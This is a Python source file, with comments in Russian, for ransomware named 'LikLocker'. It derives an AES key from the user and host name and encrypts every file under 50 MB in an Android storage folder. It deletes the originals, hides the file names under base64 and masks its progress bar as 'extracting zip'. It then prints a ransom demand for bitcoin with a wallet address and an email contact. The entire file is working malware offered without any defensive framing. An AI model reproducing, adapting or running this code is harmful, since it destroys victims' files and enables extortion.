import os
import base64
import hashlib
import getpass
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from tqdm import tqdm
import pyfiglet
from termcolor import colored

def generate_key():
    username = getpass.getuser()
    hostname = os.uname()[1]
    unique_string = f"{username}{hostname}"
    return hashlib.sha256(unique_string.encode()).digest()

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    
    if len(plaintext) > 50 * 1024 * 1024:  # Размер файла больше 50 МБ
        return  # Пропускаем файл без вывода ошибки

    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    iv = cipher.iv
    
    encrypted_file_path = file_path + '.LikLock'
    
    # Запись зашифрованного файла с отображением прогресса
    with open(encrypted_file_path, 'wb') as file:
        file.write(iv + ciphertext)

    # Удаляем оригинальный файл после успешного шифрования
    os.remove(file_path)
    
    # Возвращаем зашифрованное имя файла
    base64_encoded_name = base64.b64encode(os.path.basename(file_path).encode()).decode()
    os.rename(encrypted_file_path, os.path.join(os.path.dirname(file_path), base64_encoded_name + '.LikLock'))
    
    return True

def encrypt_directory(directory, key):
    files_to_encrypt = []
    
    # Собираем все файлы для шифрования
    for root, _, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            if not filename.endswith('.LikLock'):
                files_to_encrypt.append(file_path)

    # Шифруем файлы с отображением прогресса
    with ThreadPoolExecutor() as executor:
        futures = {executor.submit(encrypt_file, file_path, key): file_path for file_path in files_to_encrypt}
        
        with tqdm(total=len(futures), desc="extracting zip", unit="file") as pbar:
            for future in as_completed(futures):
                file_path = futures[future]
                try:
                    future.result()  # Получаем результат выполнения
                    pbar.set_postfix(file=file_path)
                except Exception as e:
                    print(f"Error encrypting {file_path}: {e}")  # Можно оставить для отладки, если необходимо
                pbar.update(1)

def display_warning():
    # Очищаем экран
    os.system('cls' if os.name == 'nt' else 'clear')

    # Генерация ASCII текста
    ascii_banner = pyfiglet.figlet_format("LikLocker")
    # Раскраска текста
    colored_banner = colored(ascii_banner, color='red')
    # Вывод на экран
    print(colored_banner)

    # Текст с предупреждением
    warning_text = "Bad news, all your important files have been encrypted by LikLocker ransomware! " \
                   "To decrypt your files, you need to download decryptor. " \
                   "To receive it, you need to send 0.005 BTC to the Bitcoin wallet A728E05dk04gsJ7H " \
                   "and write about successful payment to LikLockerRransomware@gmail.com " \
                   "and wait until they send you decryptor."

    # Окружение текста точками
    border_length = len(warning_text) + 2  # длина текста + 2 для точек по краям
    border = '.' * border_length  # рамка из точек

    # Вывод на экран
    print(border)
    print(colored(f".{warning_text}.", color='red'))  # текст в рамке
    print(border)

def main():
    directory = '/storage/emulated/0/limbo/'  # Установленный путь
    key = generate_key()  # Генерируем уникальный ключ для устройства
    encrypt_directory(directory, key)
    print("Шифрование завершено.")
    display_warning()

if __name__ == "__main__":
    main()